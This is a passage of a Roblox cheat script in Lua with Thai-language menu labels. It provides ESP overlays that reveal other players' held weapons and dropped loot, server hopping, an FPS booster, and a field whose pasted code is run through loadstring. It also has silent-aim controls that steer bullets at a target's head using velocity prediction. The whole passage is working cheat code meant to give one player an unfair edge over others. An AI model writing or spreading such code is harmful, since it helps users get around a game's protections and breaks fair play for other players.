local function refreshAllBillboards()
    for _,player in ipairs(Players:GetPlayers()) do
        clearBillboard(player)
        if ShowItemESP then buildBillboard(player) end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        task.wait(1)
        if ShowItemESP then buildBillboard(player) end
    end)
end)
Players.PlayerRemoving:Connect(clearBillboard)
for _,player in ipairs(Players:GetPlayers()) do
    if player~=LocalPlayer then
        player.CharacterAdded:Connect(function()
            task.wait(1)
            if ShowItemESP then buildBillboard(player) end
        end)
    end
end

ESPTab:Toggle({
    Title="ESP Item",Desc="แสดงอาวุธที่ผู้เล่นถืออยู่เหนือหัว",Default=false,
    Callback=function(v)
        ShowItemESP=v
        refreshAllBillboards()
    end
})

ESPTab:Section({Title="ดูของที่ตกอยู่ที่พื้น"})
getgenv().ItemESPEnabled=false
getgenv().ItemESPMaxDist=500
local ItemESPDrawings={}
local RarityColors={
    Common=Color3.fromRGB(255,255,255),Uncommon=Color3.fromRGB(100,255,100),
    Rare=Color3.fromRGB(0,150,255),Epic=Color3.fromRGB(180,50,255),
    Legendary=Color3.fromRGB(255,150,0),Omega=Color3.fromRGB(255,0,50)
}
local function UpdateItemESP()
    if not getgenv().ItemESPEnabled then
        for _,draw in pairs(ItemESPDrawings) do
            if draw.Dot then draw.Dot.Visible=false end
            if draw.Label then draw.Label.Visible=false end
        end
        return
    end
    local dropped=workspace:FindFirstChild("DroppedItems")
    if not dropped then return end
    local myRoot=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return end
    local fovCenter=Vector2.new(Camera.ViewportSize.X/2,Camera.ViewportSize.Y/2)
    for _,item in ipairs(dropped:GetChildren()) do
        if item:IsA("Model") and item:FindFirstChild("PickUpZone") then
            local pz=item.PickUpZone
            local pos,onScreen=Camera:WorldToViewportPoint(pz.Position)
            local dist=(myRoot.Position-pz.Position).Magnitude
            if not ItemESPDrawings[item] then
                ItemESPDrawings[item]={Dot=Drawing.new("Circle"),Label=Drawing.new("Text")}
            end
            local draw=ItemESPDrawings[item]
            local screenPos=Vector2.new(pos.X,pos.Y)
            local inFOV=(screenPos-fovCenter).Magnitude<=getgenv().FOV_Radius
            if onScreen and dist<getgenv().ItemESPMaxDist then
                local color=Color3.new(1,1,1)
                local ok,template=pcall(function() return ReplicatedStorage.Items:FindFirstChild(item.Name,true) end)
                if ok and template then color=RarityColors[template:GetAttribute("RarityName")] or color end
                draw.Dot.Visible=true draw.Dot.Position=screenPos
                draw.Dot.Radius=inFOV and 6 or 3 draw.Dot.Color=color
                draw.Dot.Filled=true draw.Dot.Transparency=inFOV and 1 or 0.5
                draw.Label.Visible=true draw.Label.Position=Vector2.new(pos.X,pos.Y-18)
                draw.Label.Text=string.format("%s [%dm]",item.Name,math.floor(dist))
                draw.Label.Color=color draw.Label.Size=inFOV and 16 or 13
                draw.Label.Center=true draw.Label.Outline=true
            else
                draw.Dot.Visible=false draw.Label.Visible=false
            end
        end
    end
end
RunService.RenderStepped:Connect(UpdateItemESP)
task.spawn(function()
    while task.wait(1) do
        for item,draw in pairs(ItemESPDrawings) do
            if not item or not item.Parent or not item:FindFirstChild("PickUpZone") then
                if draw.Dot then draw.Dot:Remove() end
                if draw.Label then draw.Label:Remove() end
                ItemESPDrawings[item]=nil
            end
        end
    end
end)
ESPTab:Toggle({
    Title="Item ESP",Desc="แสดงชื่อและระยะของไอเท็มที่ตกอยู่บนพื้น",Default=false,
    Callback=function(v) getgenv().ItemESPEnabled=v end
})
ESPTab:Slider({
    Title="Item ESP Distance",Desc="ระยะที่จะแสดง Item ESP",Step=25,
    Value={Min=50,Max=1000,Default=500},
    Callback=function(v) getgenv().ItemESPMaxDist=v end
})

-- SERVER TAB
ServerTab:Button({
    Title="Server Hop",
    Callback=function()
        local servers=HttpService:JSONDecode(game:HttpGet(
            ("https://games.roblox.com/v1/games/%s/servers/Public?limit=100"):format(game.PlaceId)
        )).data
        for _,s in ipairs(servers) do
            if s.playing<s.maxPlayers then
                TeleportService:TeleportToPlaceInstance(game.PlaceId,s.id)
                break
            end
        end
    end
})
ServerTab:Button({
    Title="Rejoin",
    Callback=function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)
    end
})

-- CUSTOM TAB
CustomTab:Section({Title="FPS Booster"})

local FPSTarget = 60
local FPSConnection = nil
local FPSEnabled = false

local function toggleFPS(state)
    FPSEnabled = state
    if FPSConnection then FPSConnection:Disconnect() FPSConnection = nil end
    if not state then return end
    
    pcall(function()
        Lighting.Brightness = 1
        Lighting.ColorShift_Bottom = Color3.new(0,0,0)
        Lighting.ColorShift_Top = Color3.new(0,0,0)
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
        Lighting.GlobalShadows = false
        Lighting.ShadowSoftness = 0
        Lighting.FogEnd = 1e10
        Lighting.FogStart = 1e10
    end)
    
    FPSConnection = RunService.RenderStepped:Connect(function()
        if not FPSEnabled then return end
        setfpscap(FPSTarget)
    end)
end

CustomTab:Toggle({
    Title = "FPS Booster",
    Desc = "เพิ่ม FPS และลบสิ่งไม่จำเป็น",
    Default = false,
    Callback = function(v) toggleFPS(v) end
})

CustomTab:Dropdown({
    Title = "Target FPS",
    Desc = "เลือก FPS ที่ต้องการ",
    Values = {"60", "80", "120", "144", "240"},
    Default = 1,
    Callback = function(v)
        FPSTarget = tonumber(v)
    end
})

CustomTab:Section({Title="Custom FOV"})
getgenv().CustomFOVCode=""
CustomTab:Input({
    Title="ใส่โค้ด FOV",Desc="วางสคริปหน้าตา FOV แล้วกดยืนยัน",
    Placeholder="วางโค้ด FOV ที่นี่...",
    Callback=function(v) getgenv().CustomFOVCode=v end
})
CustomTab:Button({
    Title="ยืนยัน Custom FOV",Desc="กดเพื่อใช้โค้ด FOV ที่ใส่ไว้",
    Callback=function()
        local code=getgenv().CustomFOVCode or ""
        if code=="" then
            game:GetService("StarterGui"):SetCore("SendNotification",{Title="Custom FOV",Text="กรุณาใส่โค้ด FOV ก่อน",Duration=3})
            return
        end
        local isFOVCode=code:find("FOV_Radius") or code:find("FOVRadius") or code:find("Drawing") or code:find("Circle") or code:find("Radius") or code:find("Lines")
        if not isFOVCode then
            game:GetService("StarterGui"):SetCore("SendNotification",{Title="Custom FOV",Text="นี่ไม่ใช่โค้ด FOV",Duration=4})
            return
        end
        local ok,err=pcall(function()
            HideAllLines()
            Lines={}
            loadstring(code)()
        end)
        if ok then
            game:GetService("StarterGui"):SetCore("SendNotification",{Title="Custom FOV",Text="เปลี่ยนหน้าตา FOV สำเร็จ!",Duration=3})
        else
            game:GetService("StarterGui"):SetCore("SendNotification",{Title="Custom FOV",Text="โค้ดผิดพลาด: "..tostring(err):sub(1,50),Duration=5})
        end
    end
})

CustomTab:Section({Title="Custom Silent Aim"})
getgenv().BulletForce=1
getgenv().StraightBullet=false
CustomTab:Toggle({
    Title="Straight Bullet",Desc="บังคับให้กระสุนยิงตรงไปยังเป้าหมายเสมอ",Default=false,
    Callback=function(v)
        getgenv().StraightBullet=v
        if v then
            game:GetService("StarterGui"):SetCore("SendNotification",{Title="Straight Bullet",Text="เปิดระบบกระสุนตรงแล้ว",Duration=2})
        end
    end
})
CustomTab:Slider({
    Title="Custom Prediction",Desc="ปรับความแม่นยำ Silent Aim",
    Step=0.005,Value={Min=0.05,Max=0.3,Default=0.165},  -- เปลี่ยน default
    Callback=function(v) getgenv().Prediction=v end
})
CustomTab:Slider({
    Title="Bullet Force",Desc="ปรับแรง offset กระสุน",
    Step=0.05,Value={Min=0.5,Max=3,Default=1},
    Callback=function(v) getgenv().BulletForce=v end
})

RunService.Heartbeat:Connect(function()
    if getgenv().StraightBullet and getgenv().SilentAimEnabled and getgenv().CurrentTargetHead then
        local head=getgenv().CurrentTargetHead
        if head and head.Parent then
            getgenv().FinalAimPos=head.Position+(head.Velocity*(getgenv().Prediction*getgenv().BulletForce))
        end
    end
end)

-- Cleanup เมื่อผู้เล่นออก
Players.PlayerRemoving:Connect(function(p)
    velocityHistory[p] = nil
    shotHistory[p] = nil
    antiLookTypes[p] = nil
end)